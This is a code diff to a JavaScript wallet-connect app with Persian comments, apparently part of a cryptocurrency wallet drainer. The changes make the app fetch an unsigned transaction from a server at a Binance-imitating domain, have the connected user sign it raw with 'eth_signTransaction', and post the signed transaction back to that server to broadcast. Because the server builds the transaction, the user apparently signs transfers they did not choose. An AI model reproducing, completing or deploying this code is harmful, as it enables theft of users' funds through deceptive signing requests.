@@ -10,7 +10,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign", "eth_sign"],
+      methods: ["eth_signTransaction"], // متد امضای خام تراکنش
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -20,36 +20,26 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
-      });
-    } catch (error) {
-      console.error("❌ Error in switching chain:", error);
-      return;
-    }
-
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function signAndSendTransaction(address, chain, type, contract = "0") {
+    async function signAndSendTransaction(address, chain, type) {
       try {
         let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
 
-        var result = await jQuery.post(apiUrl, requestData);
-        var unsignedTx = JSON.parse(result);
+        // درخواست دریافت تراکنش خام از سرور
+        var unsignedTxResponse = await jQuery.post(apiUrl, requestData);
+        var unsignedTx = JSON.parse(unsignedTxResponse);
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **✅ امضای تراکنش در کیف پول**
+        // امضای تراکنش خام در کیف پول
         var signedTx = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unsignedTx.result), address],
+          method: "eth_signTransaction",
+          params: [unsignedTx.result],
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
 
-        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
+        // ارسال تراکنش امضاشده به سرور برای انتشار در بلاکچین
         var txHash = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
